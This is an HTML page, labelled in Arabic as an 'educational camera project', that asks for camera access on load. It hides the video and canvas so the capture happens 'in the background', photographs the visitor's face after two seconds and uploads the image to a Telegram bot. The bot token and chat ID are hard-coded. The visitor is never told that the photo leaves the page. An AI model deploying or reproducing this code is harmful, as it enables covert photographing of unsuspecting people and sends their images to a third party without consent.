<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشروع الكاميرا التعليمي</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f0f0f0; margin: 0; }
        video { display: none; } /* إخفاء الفيديو ليتم التصوير في الخلفية */
        canvas { display: none; }
        .status { padding: 20px; color: #333; }
    </style>
</head>
<body>

    <div class="status" id="status">جاري طلب صلاحية الكاميرا...</div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = '7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ';
        const chatId = '56081692';
        const statusDiv = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // 1. طلب الوصول للكاميرا
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                video.srcObject = stream;
                statusDiv.innerText = "تم السماح. جاري المعالجة...";
                
                // الانتظار قليلاً حتى تستقر الصورة ثم الالتقاط
                setTimeout(takePhoto, 2000); 
            } catch (err) {
                statusDiv.innerText = "فشل الوصول للكاميرا: " + err.message;
            }
        }

        // 2. التقاط الصورة وتحويلها لبيانات
        function takePhoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // تحويل الصورة إلى Blob لإرسالها كملف
            canvas.toBlob(sendToTelegram, 'image/jpeg', 0.8);
        }

        // 3. إرسال الصورة إلى بوت تليجرام
        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.ok) {
                    statusDiv.innerText = "تمت العملية بنجاح.";
                } else {
                    statusDiv.innerText = "خطأ في الإرسال: " + data.description;
                }
            })
            .catch(error => {
                statusDiv.innerText = "خطأ في الاتصال بالخادم.";
                console.error(error);
            });
        }

        // بدء التشغيل عند تحميل الصفحة
        window.onload = startCamera;
    </script>
</body>
</html>
